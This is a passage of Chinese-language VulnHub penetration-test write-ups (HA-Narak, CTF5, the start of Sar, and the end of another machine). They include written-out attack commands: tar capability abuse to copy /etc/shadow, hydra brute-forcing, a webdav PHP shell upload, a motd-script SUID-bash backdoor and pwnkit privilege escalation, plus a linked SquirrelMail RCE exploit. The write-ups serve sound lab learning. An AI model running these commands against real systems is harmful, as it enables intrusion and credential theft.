src="https://cdn.jsdelivr.net/gh/FYHypo/FYHypo.github.io@main/img/pic/Pasted%20image%2020240227150519.png"></p><h3 id="纵向"><a href="#纵向" class="headerlink" title="纵向"></a>纵向</h3><h4 id="capbility越权读取"><a href="#capbility越权读取" class="headerlink" title="capbility越权读取"></a>capbility越权读取</h4><blockquote><p>跑linpeas：</p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/FYHypo/FYHypo.github.io@main/img/pic/Pasted%20image%2020240227174049.png"></p><p><img src="https://cdn.jsdelivr.net/gh/FYHypo/FYHypo.github.io@main/img/pic/Pasted%20image%2020240227152200.png"></p><blockquote><p>tar居然给了read_search的能力，直接打包shadow文件，其实应该可以直接打包root flag偷家。<br>    cap_dac_read_search：这是一种扩展文件权限标志，表示该文件具有读取和搜索访问权限，通常用于文件系统的访问。具体来说，这个标志允许 tar 命令读取文件和搜索目录，而&#x3D;&#x3D;不需要使用者拥有完全的文件访问权限&#x3D;&#x3D;。</p></blockquote><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cd</span> tmp<br>tar -cvf shadow.tar /etc/shadow<br><span class="hljs-built_in">ls</span><br>scp -r -P 7822 norris@10.10.10.143:/tmp/shadow.tar .<br>tar -xvf shadow.tar<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/FYHypo/FYHypo.github.io@main/img/pic/Pasted%20image%2020240227154339.png"></p><blockquote><p>morris无法执行tar命令，换norris：</p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/FYHypo/FYHypo.github.io@main/img/pic/Pasted%20image%2020240227154823.png"></p><blockquote><p>下载passwd合并破解：</p></blockquote><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">scp -r -P 7822 norris@10.10.10.143:/etc/passwd .<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/FYHypo/FYHypo.github.io@main/img/pic/Pasted%20image%2020240227165536.png"></p><blockquote><p>感觉没希望，去看了wp</p></blockquote><h4 id="polkit-agent-helper提权"><a href="#polkit-agent-helper提权" class="headerlink" title="polkit-agent-helper提权"></a>polkit-agent-helper提权</h4><blockquote><p>配合suid</p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/FYHypo/FYHypo.github.io@main/img/pic/Pasted%20image%2020240227165845.png"></p><blockquote><p>利用条件：root的s位，有执行权限</p></blockquote><blockquote><p>原理：polkit是linux系统中针对文件权限管理的一套机制，而helper相当于是充当一个介于操作者与被操作文件的一个中介，会通过这个helper去调用执行文件。因此如果我们能够借助helper的高权限，以root的身份调用bash，即可实现提权</p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/FYHypo/FYHypo.github.io@main/img/pic/Pasted%20image%2020240229122356.png"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment">#两种方法：</span><br>systemd-run -t /bin/bash<br>systemd-run --shell<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/FYHypo/FYHypo.github.io@main/img/pic/Pasted%20image%2020240229122838.png"></p><h4 id="pwnkit-CVE-2021-4034"><a href="#pwnkit-CVE-2021-4034" class="headerlink" title="pwnkit (CVE-2021-4034)"></a>pwnkit (CVE-2021-4034)</h4><blockquote><p>利用条件：对环境无特殊要求，各主流linux都可能存在，典型是pkexec的0.105版本。&#x3D;&#x3D;即该漏洞可以通杀很多低版本机器&#x3D;&#x3D;</p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/FYHypo/FYHypo.github.io@main/img/pic/Pasted%20image%2020240229123209.png"></p><blockquote><p>另外：在linpeas枚举时也反馈出大概率有这个漏洞</p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/FYHypo/FYHypo.github.io@main/img/pic/Pasted%20image%2020240227174049.png"></p><p><img src="https://cdn.jsdelivr.net/gh/FYHypo/FYHypo.github.io@main/img/pic/Pasted%20image%2020240229123319.png"></p><p><img src="https://cdn.jsdelivr.net/gh/FYHypo/FYHypo.github.io@main/img/pic/Pasted%20image%2020240229123353.png"></p><blockquote><p>由于该靶机无gcc，有python，故选取python的exp</p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/FYHypo/FYHypo.github.io@main/img/pic/Pasted%20image%2020240229123531.png"></p><p><img src="https://cdn.jsdelivr.net/gh/FYHypo/FYHypo.github.io@main/img/pic/Pasted%20image%2020240229124033.png"></p><p><img src="https://cdn.jsdelivr.net/gh/FYHypo/FYHypo.github.io@main/img/pic/Pasted%20image%2020240229124126.png"></p><h2 id="0x06-总结"><a href="#0x06-总结" class="headerlink" title="0x06 总结"></a>0x06 总结</h2><ol><li>端口扫描：ftp、nfs、web、ssh（7822），nikto枚举到了隐藏目录</li><li>ftp：匿名登录失败</li><li>nfs挂载：挂载成功到morris的家目录，但无有效信息</li><li>web渗透：目录爆破出隐藏目录mysite，在其中的cs文件发现jsfuck码，解码拿到凭据，根据已有信息得出两个用户名norris和morris，登录到了norris</li><li>横向提权：根据线索发现隐藏swp文件，恢复后拿到morris的密码，成功登录</li><li>纵向提权：考虑到norris的权限组更好，换回norris，经过枚举发现tar命令具有危险的文件能力，越权打包root目录成功偷家；枚举suid，发现polkit-agent-helper具有root的s位，以此提权；枚举到可能存在pwnkit漏洞，利用py exp成功提权</li></ol>]]></content>
    
    
    <categories>
      
      <category>vulnhub</category>
      
    </categories>
    
    
    <tags>
      
      <tag>pentest</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>vulnhub HA-Narak</title>
    <link href="/blog/vulnhub/vulnhub%20HA-Narak/"/>
    <url>/blog/vulnhub/vulnhub%20HA-Narak/</url>
    
    <content type="html"><![CDATA[<h2 id="0x01-端口扫描"><a href="#0x01-端口扫描" class="headerlink" title="0x01 端口扫描"></a>0x01 端口扫描</h2><p><img src="https://cdn.jsdelivr.net/gh/FYHypo/FYHypo.github.io@main/img/pic/Pasted%20image%2020240223163728.png"></p><p><img src="https://cdn.jsdelivr.net/gh/FYHypo/FYHypo.github.io@main/img/pic/Pasted%20image%2020240223164335.png"></p><p><img src="https://cdn.jsdelivr.net/gh/FYHypo/FYHypo.github.io@main/img/pic/Pasted%20image%2020240223164423.png"></p><p><img src="https://cdn.jsdelivr.net/gh/FYHypo/FYHypo.github.io@main/img/pic/Pasted%20image%2020240223164833.png"></p><p><img src="https://cdn.jsdelivr.net/gh/FYHypo/FYHypo.github.io@main/img/pic/Pasted%20image%2020240223171345.png"></p><h2 id="0x02-web渗透"><a href="#0x02-web渗透" class="headerlink" title="0x02 web渗透"></a>0x02 web渗透</h2><p><img src="https://cdn.jsdelivr.net/gh/FYHypo/FYHypo.github.io@main/img/pic/Pasted%20image%2020240223171544.png"></p><p><img src="https://cdn.jsdelivr.net/gh/FYHypo/FYHypo.github.io@main/img/pic/Pasted%20image%2020240223171632.png"></p><blockquote><p>给了一堆图片和一段抽象文字，目录爆破的同时把图片全部检查一下：</p></blockquote><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">wget http://10.10.10.142/images/&#123;1..20&#125;.jpg http://10.10.10.142/images/666.jpg<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/FYHypo/FYHypo.github.io@main/img/pic/Pasted%20image%2020240223173159.png"></p><p><img src="https://cdn.jsdelivr.net/gh/FYHypo/FYHypo.github.io@main/img/pic/Pasted%20image%2020240223173133.png"></p><blockquote><p>行不通，看目录爆破</p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/FYHypo/FYHypo.github.io@main/img/pic/Pasted%20image%2020240223173627.png"></p><blockquote><p>扫到了401未授权的页面webdav</p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/FYHypo/FYHypo.github.io@main/img/pic/Pasted%20image%2020240223173714.png"></p><blockquote><p>实在没思路，去看了wp</p></blockquote><h3 id="cewl生成字典"><a href="#cewl生成字典" class="headerlink" title="cewl生成字典"></a>cewl生成字典</h3><blockquote><p>web页面有一长段文字，对其进行cewl爬取，生成字典，爆破登录页</p></blockquote><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">cewl 10.10.10.142 -w 1.txt<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/FYHypo/FYHypo.github.io@main/img/pic/Pasted%20image%2020240223174222.png"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">hydra http-get -L 1.txt -P 1.txt 10.10.10.142/webdav<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/FYHypo/FYHypo.github.io@main/img/pic/Pasted%20image%2020240223175040.png"></p><blockquote><p>拿到了凭据：yamdoot@Swarg</p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/FYHypo/FYHypo.github.io@main/img/pic/Pasted%20image%2020240223175140.png"></p><blockquote><p>可以登录，使用客户端工具上传文件：</p></blockquote><h3 id="webdav利用"><a href="#webdav利用" class="headerlink" title="webdav利用"></a>webdav利用</h3><blockquote><p>cadaver工具可以连接webdav服务</p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/FYHypo/FYHypo.github.io@main/img/pic/Pasted%20image%2020240223175544.png"></p><p><img src="https://cdn.jsdelivr.net/gh/FYHypo/FYHypo.github.io@main/img/pic/Pasted%20image%2020240223175554.png"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">cadaver<br>open http://10.10.10.142/webdav<br></code></pre></td></tr></table></figure><blockquote><p>上传shell：</p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/FYHypo/FYHypo.github.io@main/img/pic/Pasted%20image%2020240223175714.png"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">put shell.php<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/FYHypo/FYHypo.github.io@main/img/pic/Pasted%20image%2020240223175735.png"></p><p><img src="https://cdn.jsdelivr.net/gh/FYHypo/FYHypo.github.io@main/img/pic/Pasted%20image%2020240223180232.png"></p><h2 id="0x03-提权"><a href="#0x03-提权" class="headerlink" title="0x03 提权"></a>0x03 提权</h2><p><img src="https://cdn.jsdelivr.net/gh/FYHypo/FYHypo.github.io@main/img/pic/Pasted%20image%2020240223180623.png"></p><blockquote><p>在~inferno拿到user flag，且是串可解码的md5：</p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/FYHypo/FYHypo.github.io@main/img/pic/Pasted%20image%2020240223180656.png"></p><blockquote><p>尝试ssh登录其他用户失败<br>尝试各基础向量失败，跑linEnum：</p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/FYHypo/FYHypo.github.io@main/img/pic/Pasted%20image%2020240223182638.png"></p><blockquote><p>没什么有用信息，跑linpeas：</p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/FYHypo/FYHypo.github.io@main/img/pic/Pasted%20image%2020240223183813.png"></p><p><img src="https://cdn.jsdelivr.net/gh/FYHypo/FYHypo.github.io@main/img/pic/Pasted%20image%2020240223183827.png"></p><p><img src="https://cdn.jsdelivr.net/gh/FYHypo/FYHypo.github.io@main/img/pic/Pasted%20image%2020240223183857.png"></p><blockquote><p>可惜无法解密</p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/FYHypo/FYHypo.github.io@main/img/pic/Pasted%20image%2020240223184158.png"></p><p><img src="https://cdn.jsdelivr.net/gh/FYHypo/FYHypo.github.io@main/img/pic/Pasted%20image%2020240223184204.png"></p><p><img src="https://cdn.jsdelivr.net/gh/FYHypo/FYHypo.github.io@main/img/pic/Pasted%20image%2020240223184307.png"></p><p><img src="https://cdn.jsdelivr.net/gh/FYHypo/FYHypo.github.io@main/img/pic/Pasted%20image%2020240223184422.png"></p><blockquote><p>这好像是web渗透阶段的hint…</p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/FYHypo/FYHypo.github.io@main/img/pic/Pasted%20image%2020240223184508.png"></p><blockquote><p>果然，没什么用<br>但是注意到这个路径十分有趣，其中包含了用户<code>/mnt/karma</code></p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/FYHypo/FYHypo.github.io@main/img/pic/Pasted%20image%2020240223184648.png"></p><blockquote><p>注意：此处的大大的标红也非常引起我们的兴趣，当成一个线索之后详细调查<br>接着往下看，发现的这个可写文件也很有趣，名字也很有本机的命名风格，查看：</p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/FYHypo/FYHypo.github.io@main/img/pic/Pasted%20image%2020240223184826.png"></p><blockquote><p>是hint，解码一把嗦：</p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/FYHypo/FYHypo.github.io@main/img/pic/Pasted%20image%2020240223185536.png"></p><p><img src="https://cdn.jsdelivr.net/gh/FYHypo/FYHypo.github.io@main/img/pic/Pasted%20image%2020240223185657.png"></p><p><img src="https://cdn.jsdelivr.net/gh/FYHypo/FYHypo.github.io@main/img/pic/Pasted%20image%2020240223190058.png"></p><blockquote><p>inferno@chitragupt</p></blockquote><blockquote><p>登录到了inferno，但是再次枚举各向量也未发现出路<br>转移思路到之前linpeas的爆红：</p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/FYHypo/FYHypo.github.io@main/img/pic/Pasted%20image%2020240223184648.png"></p><p><img src="https://cdn.jsdelivr.net/gh/FYHypo/FYHypo.github.io@main/img/pic/Pasted%20image%2020240223190759.png"></p><p><img src="https://cdn.jsdelivr.net/gh/FYHypo/FYHypo.github.io@main/img/pic/Pasted%20image%2020240223190924.png"></p><p><img src="https://cdn.jsdelivr.net/gh/FYHypo/FYHypo.github.io@main/img/pic/Pasted%20image%2020240223191400.png"></p><p><img src="https://cdn.jsdelivr.net/gh/FYHypo/FYHypo.github.io@main/img/pic/Pasted%20image%2020240223191532.png"></p><blockquote><p>按照利用，和fowsniff的提权方法类似，劫持root的执行文件，本方法直接替换了两人的bash执行文件</p></blockquote><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;cp /bin/bash /home/inferno/bash &amp;&amp; chmod u+s /home/inferno/bash&quot;</span> &gt;&gt; /etc/update-motd.d/00-header<br>./bash -p<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/FYHypo/FYHypo.github.io@main/img/pic/Pasted%20image%2020240223192942.png"></p><blockquote><p>按照利用成功提权</p></blockquote>]]></content>
    
    
    <categories>
      
      <category>vulnhub</category>
      
    </categories>
    
    
    <tags>
      
      <tag>pentest</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>vulnhub CTF5</title>
    <link href="/blog/vulnhub/vulnhub%20CTF5/"/>
    <url>/blog/vulnhub/vulnhub%20CTF5/</url>
    
    <content type="html"><![CDATA[<h2 id="0x01-端口扫描"><a href="#0x01-端口扫描" class="headerlink" title="0x01 端口扫描"></a>0x01 端口扫描</h2><p><img src="https://cdn.jsdelivr.net/gh/FYHypo/FYHypo.github.io@main/img/pic/Pasted%20image%2020240221192354.png"></p><p><img src="https://cdn.jsdelivr.net/gh/FYHypo/FYHypo.github.io@main/img/pic/Pasted%20image%2020240221193550.png"></p><blockquote><p>web、smb、mysql、pop3、imap、ssh</p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/FYHypo/FYHypo.github.io@main/img/pic/Pasted%20image%2020240221194507.png"></p><blockquote><p>web服务扫到了sql注入、csrf、phpmyadmin</p></blockquote><h2 id="0x02-smtp服务"><a href="#0x02-smtp服务" class="headerlink" title="0x02 smtp服务"></a>0x02 smtp服务</h2><p><img src="https://cdn.jsdelivr.net/gh/FYHypo/FYHypo.github.io@main/img/pic/Pasted%20image%2020240221194816.png"></p><blockquote><p>smtp服务仅用于传输电子邮件，无法查看信息；而pop3和imap需要提供登录凭证，故现焦点聚集在web处</p></blockquote><h2 id="0x03-web渗透"><a href="#0x03-web渗透" class="headerlink" title="0x03 web渗透"></a>0x03 web渗透</h2><p><img src="https://cdn.jsdelivr.net/gh/FYHypo/FYHypo.github.io@main/img/pic/Pasted%20image%2020240221195149.png"></p><blockquote><p>看着就很像有cms的样子，在跑目录爆破的同时先初步侦查：</p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/FYHypo/FYHypo.github.io@main/img/pic/Pasted%20image%2020240221201546.png"></p><blockquote><p>使用的是nanocms</p></blockquote><h3 id="sql注入"><a href="#sql注入" class="headerlink" title="sql注入"></a>sql注入</h3><blockquote><p>在list目录下发现注入点：</p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/FYHypo/FYHypo.github.io@main/img/pic/Pasted%20image%2020240222184143.png"></p><p><img src="https://cdn.jsdelivr.net/gh/FYHypo/FYHypo.github.io@main/img/pic/Pasted%20image%2020240222184240.png"></p><p><img src="https://cdn.jsdelivr.net/gh/FYHypo/FYHypo.github.io@main/img/pic/Pasted%20image%2020240222184535.png"></p><blockquote><p>报错注入函数不存在，换布尔盲注：</p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/FYHypo/FYHypo.github.io@main/img/pic/Pasted%20image%2020240222185617.png"></p><blockquote><p>回显不会变，换时间盲注：</p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/FYHypo/FYHypo.github.io@main/img/pic/Pasted%20image%2020240222185541.png"></p><blockquote><p>可以成功，不想写脚本，所以用了sqlmap：</p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/FYHypo/FYHypo.github.io@main/img/pic/Pasted%20image%2020240222185730.png"></p><p><img src="https://cdn.jsdelivr.net/gh/FYHypo/FYHypo.github.io@main/img/pic/Pasted%20image%2020240222185941.png"></p><blockquote><p>在drupal-users下拿到用户凭据，破解哈希：</p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/FYHypo/FYHypo.github.io@main/img/pic/Pasted%20image%2020240222190200.png"></p><blockquote><p>拿到四个凭据</p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/FYHypo/FYHypo.github.io@main/img/pic/Pasted%20image%2020240222190409.png"></p><blockquote><p>经尝试，并非ssh凭据，为events的登录凭据：</p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/FYHypo/FYHypo.github.io@main/img/pic/Pasted%20image%2020240222191049.png"></p><p><img src="https://cdn.jsdelivr.net/gh/FYHypo/FYHypo.github.io@main/img/pic/Pasted%20image%2020240222191145.png"></p><blockquote><p>但是没有包含点无法利用，这条路放弃了，攻击点转向cms</p></blockquote><h3 id="NanoCMS"><a href="#NanoCMS" class="headerlink" title="NanoCMS"></a>NanoCMS</h3><p><img src="https://cdn.jsdelivr.net/gh/FYHypo/FYHypo.github.io@main/img/pic/Pasted%20image%2020240222110142.png"></p><p><img src="https://cdn.jsdelivr.net/gh/FYHypo/FYHypo.github.io@main/img/pic/Pasted%20image%2020240222110238.png"></p><blockquote><p>根据公开漏洞所说，该页面会暴露出用户名和密码的哈希：</p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/FYHypo/FYHypo.github.io@main/img/pic/Pasted%20image%2020240222110335.png"><br><img src="https://cdn.jsdelivr.net/gh/FYHypo/FYHypo.github.io@main/img/pic/Pasted%20image%2020240222110407.png"></p><blockquote><p>凭据：admin@shannon</p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/FYHypo/FYHypo.github.io@main/img/pic/Pasted%20image%2020240222110657.png"></p><blockquote><p>按照利用中的说明，我们可以编辑php文件拿到控制权</p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/FYHypo/FYHypo.github.io@main/img/pic/Pasted%20image%2020240222112154.png"></p><p><img src="https://cdn.jsdelivr.net/gh/FYHypo/FYHypo.github.io@main/img/pic/Pasted%20image%2020240222112202.png"></p><blockquote><p>写马反弹shell：</p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/FYHypo/FYHypo.github.io@main/img/pic/Pasted%20image%2020240222112450.png"></p><h2 id="0x04-提权"><a href="#0x04-提权" class="headerlink" title="0x04 提权"></a>0x04 提权</h2><blockquote><p>linEnum枚举：</p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/FYHypo/FYHypo.github.io@main/img/pic/Pasted%20image%2020240222113409.png"></p><p><img src="https://cdn.jsdelivr.net/gh/FYHypo/FYHypo.github.io@main/img/pic/Pasted%20image%2020240222113451.png"></p><p><img src="https://cdn.jsdelivr.net/gh/FYHypo/FYHypo.github.io@main/img/pic/Pasted%20image%2020240222113711.png"></p><blockquote><p>尝试枚举各提权向量无果，又无gcc，看了wp：<br>竟然是把root的密码写在了家目录的隐藏文件中</p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/FYHypo/FYHypo.github.io@main/img/pic/Pasted%20image%2020240222121209.png"></p><p><img src="https://cdn.jsdelivr.net/gh/FYHypo/FYHypo.github.io@main/img/pic/Pasted%20image%2020240222121220.png"></p><p><img src="https://cdn.jsdelivr.net/gh/FYHypo/FYHypo.github.io@main/img/pic/Pasted%20image%2020240222121348.png"></p><blockquote><p>执行过报错root passwd的操作</p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/FYHypo/FYHypo.github.io@main/img/pic/Pasted%20image%2020240222121557.png"></p><blockquote><p>root@50$cent</p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/FYHypo/FYHypo.github.io@main/img/pic/Pasted%20image%2020240222121823.png"></p><h2 id="0x05-反思总结"><a href="#0x05-反思总结" class="headerlink" title="0x05 反思总结"></a>0x05 反思总结</h2><blockquote><p>本题至少有4种解法：nanocms漏洞、ssh爆破、sql注入、SquirrelMail公开漏洞<br>参考： <a href="https://github.com/blinils/CTF/blob/master/CTF-VulnLabs/lampsecurity-CTF5/README.md">https://github.com/blinils/CTF/blob/master/CTF-VulnLabs/lampsecurity-CTF5/README.md</a></p></blockquote><h2 id="0x06-总结"><a href="#0x06-总结" class="headerlink" title="0x06 总结"></a>0x06 总结</h2><ol><li>端口扫描：扫到了smb、pop3、imap等文件服务，因为没有登录凭据，故从web渗透开始</li><li>web渗透：识别出nanocms，搜索公开漏洞，找到泄露admin密码哈希的目录，以凭据登录cms后修改文件，成功执行php代码，拿到立足点</li><li>提权：在某个用户的家目录下存在.tomboy隐藏文件权限设置错误，任何用户可查看，拿到其中保存的root用户的密码，成功提权</li></ol><h2 id="0x07-解2–squirrelmail"><a href="#0x07-解2–squirrelmail" class="headerlink" title="0x07 解2–squirrelmail"></a>0x07 解2–squirrelmail</h2><blockquote><p>由目录爆破结果来到squirrelmail登录页面：</p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/FYHypo/FYHypo.github.io@main/img/pic/Pasted%20image%2020240222183313.png"></p><blockquote><p>SquirrelMail 是一个基于 Web 的邮件客户端，主要用于管理和访问通过 IMAP 和 POP3 协议存储的电子邮件。它提供了一个用户友好的界面，允许用户通过 Web 浏览器收发邮件、创建文件夹、搜索等操作。</p></blockquote><blockquote><p>需要我们有用户登录凭证，尝试sql注入得到的凭据错误，考虑爆破<br>用户名可以通过文件包含点获得，也可以通过之前sql注入结果得知：</p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/FYHypo/FYHypo.github.io@main/img/pic/Pasted%20image%2020240222192408.png"></p><p><img src="https://cdn.jsdelivr.net/gh/FYHypo/FYHypo.github.io@main/img/pic/Pasted%20image%2020240222192606.png"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">hydra -L user.txt -P /usr/share/wordlists/rockyou.txt 10.10.10.141 http-post-form <span class="hljs-string">&quot;/mail/src/redirect.php:js_autodetect_results=1&amp;just_logged_in=1&amp;login_username=^USER^&amp;secretkey=^PASS^:ERROR&quot;</span><br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/FYHypo/FYHypo.github.io@main/img/pic/Pasted%20image%2020240222193659.png"></p><p><img src="https://cdn.jsdelivr.net/gh/FYHypo/FYHypo.github.io@main/img/pic/Pasted%20image%2020240222193721.png"></p><blockquote><p>成功登录</p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/FYHypo/FYHypo.github.io@main/img/pic/Pasted%20image%2020240222194133.png"></p><blockquote><p>拿到版本号，搜索公开漏洞：</p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/FYHypo/FYHypo.github.io@main/img/pic/Pasted%20image%2020240222194245.png"></p><blockquote><p>注意：本地的exp有问题跑不起来，exp下载地址：(<a href="https://legalhackers.com/exploits/CVE-2017-7692/SquirrelMail_RCE_exploit.sh">https://legalhackers.com/exploits/CVE-2017-7692/SquirrelMail_RCE_exploit.sh</a>)</p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/FYHypo/FYHypo.github.io@main/img/pic/Pasted%20image%2020240222195326.png"></p><p><img src="https://cdn.jsdelivr.net/gh/FYHypo/FYHypo.github.io@main/img/pic/Pasted%20image%2020240222195341.png"></p><p><img src="https://cdn.jsdelivr.net/gh/FYHypo/FYHypo.github.io@main/img/pic/Pasted%20image%2020240222195227.png"></p><blockquote><p>拿到立足点</p></blockquote><h2 id="0x08-解3–ssh爆破"><a href="#0x08-解3–ssh爆破" class="headerlink" title="0x08 解3–ssh爆破"></a>0x08 解3–ssh爆破</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">hydra -L user.txt -P /usr/share/wordlists/rockyou.txt 10.10.10.141 ssh -t 10<br></code></pre></td></tr></table></figure><blockquote><p>注意：hydra爆破时加密算法报错解决方法如下</p></blockquote><h3 id="hydra爆破时加密算法报错解决方法"><a href="#hydra爆破时加密算法报错解决方法" class="headerlink" title="hydra爆破时加密算法报错解决方法"></a>hydra爆破时加密算法报错解决方法</h3><p><img src="https://cdn.jsdelivr.net/gh/FYHypo/FYHypo.github.io@main/img/pic/Pasted%20image%2020240222202817.png"></p><blockquote><p>在<code>/etc/ssh/ssh_config</code>中加入以下内容</p></blockquote><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">KexAlgorithms</span> diffie-hellman-group-exchange-sha1,diffie-hellman-group14-sha1,diffie-hellman-group1-sha1<br>    <span class="hljs-attribute">HostKeyAlgorithms</span> ssh-rsa,ssh-dss<br>    <span class="hljs-comment"># Ciphers 3des-cbc</span><br>    <span class="hljs-attribute">MACs</span> hmac-md5,hmac-sha1,hmac-ripemd160,hmac-ripemd160@openssh.com,hmac-sha1-<span class="hljs-number">96</span>,hmac-md5-<span class="hljs-number">96</span><br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/FYHypo/FYHypo.github.io@main/img/pic/Pasted%20image%2020240222202944.png"></p><blockquote><p>开始爆破：</p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/FYHypo/FYHypo.github.io@main/img/pic/Pasted%20image%2020240222203017.png"></p><p><img src="https://cdn.jsdelivr.net/gh/FYHypo/FYHypo.github.io@main/img/pic/Pasted%20image%2020240222211346.png"></p><blockquote><p>成功拿到两个ssh凭据，以patrick登录<br>注意：爆破完之后把ssh_config的最后一句重新注释掉，否则无法正常ssh连接</p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/FYHypo/FYHypo.github.io@main/img/pic/Pasted%20image%2020240222212018.png"></p><blockquote><p>查看bash_history：</p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/FYHypo/FYHypo.github.io@main/img/pic/Pasted%20image%2020240222212138.png"></p><blockquote><p>由于失误将<code>su</code>拼错为<code>sus</code>，后面输入的root的密码被明文显示了，使用其可直接完成提权</p></blockquote>]]></content>
    
    
    <categories>
      
      <category>vulnhub</category>
      
    </categories>
    
    
    <tags>
      
      <tag>pentest</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>vulnhub Sar</title>
    <link href="/blog/vulnhub/vulnhub%20Sar/"/>
    <url>/blog/vulnhub/vulnhub%20Sar/</url>
    
    <content type="html"><![CDATA[<h2 id="0x01-端口扫描"><a href="#0x01-端口扫描" class="headerlink" title="0x01 端口扫描"></a>0x01 端口扫描</h2><p><img src="https://cdn.jsdelivr.net/gh/FYHypo/FYHypo.github.io@main/img/pic/Pasted%20image%2020240216102555.png"></p><p><img src="https://cdn.jsdelivr.net/gh/FYHypo/FYHypo.github.io@main/img/pic/Pasted%20image%2020240216102709.png"></p><blockquote><p>只开放了80</p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/FYHypo/FYHypo.github.io@main/img/pic/Pasted%20image%2020240216102828.png"></p><p><img src="https://cdn.jsdelivr.net/gh/FYHypo/FYHypo.github.io@main/img/pic/Pasted%20image%2020240216102924.png"></p><h2 id="0x02-web渗透"><a href="#0x02-web渗透" class="headerlink" title="0x02 web渗透"></a>0x02 web渗透</h2><p><img src="https://cdn.jsdelivr.net/gh/FYHypo/FYHypo.github.io@main/img/pic/Pasted%20image%2020240216103200.png"></p><blockquote><p>目录爆破没有新的发现</p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/FYHypo/FYHypo.github.io@main/img/pic/Pasted%20image%2020240216103305.png"></p><p><img src="https://cdn.jsdelivr.net/gh/FYHypo/FYHypo.github.io@main/img/pic/Pasted%20image%2020240216110325.png"></p><h3 id="文件上传"><a 